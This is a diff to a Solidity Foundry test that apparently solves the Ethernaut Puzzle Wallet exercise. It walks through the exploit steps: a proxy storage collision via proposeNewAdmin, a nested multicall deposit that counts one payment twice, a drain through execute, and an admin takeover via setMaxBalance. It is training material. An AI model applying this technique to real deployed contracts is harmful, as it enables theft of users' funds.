@@ -18,7 +18,7 @@ contract PuzzleWalletTest is Test {
         puzzleProxyAsWallet = PuzzleWallet(address(puzzleProxy));
 
         puzzleProxyAsWallet.addToWhitelist(address(this));
-        puzzleProxyAsWallet.deposit{value: 1000}();
+        puzzleProxyAsWallet.deposit{value: 1000000000000000}();
 
         vm.deal(attacker, 10 ether);
     }
@@ -29,14 +29,15 @@ contract PuzzleWalletTest is Test {
         puzzleProxy.proposeNewAdmin(attacker);
         puzzleProxyAsWallet.addToWhitelist(attacker);
 
-        bytes[] memory data = new bytes[](3);
+        bytes[] memory data = new bytes[](2);
         bytes[] memory nestedData = new bytes[](1);
         nestedData[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
         data[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
         data[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, nestedData);
-        data[2] = abi.encodeWithSelector(PuzzleWallet.execute.selector, attacker, 2000, "");
 
-        puzzleProxyAsWallet.multicall{value: 1000}(data);
+        puzzleProxyAsWallet.multicall{value: 1000000000000000}(data);
+
+        puzzleProxyAsWallet.execute(attacker, 2000000000000000, "");
 
         puzzleProxyAsWallet.setMaxBalance(uint160(attacker));
 
